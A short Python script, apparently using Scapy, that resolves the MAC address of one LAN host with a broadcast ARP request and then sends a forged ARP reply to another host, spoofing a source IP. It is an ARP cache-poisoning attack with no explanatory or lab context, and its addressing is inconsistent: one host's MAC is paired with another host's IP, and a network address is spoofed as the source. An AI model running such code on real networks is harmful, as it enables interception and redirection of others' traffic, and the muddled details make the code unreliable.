broadcast = Ether(dst='ff:ff:ff:ff:ff:ff')

arp_layer = ARP(pdst='192.168.2.104')

entire_packet = broadcast/arp_layer

answer = srp(entire_packet, timeout=2, verbose=True)[0]

target_mac_address = answer[0][1].hwsrc

packet = ARP(op=2, hwdst=target_mac_address, pdst='192.168.2.105', psrc='192.168.2.0')
print(packet.show())
send(packet, verbose=False)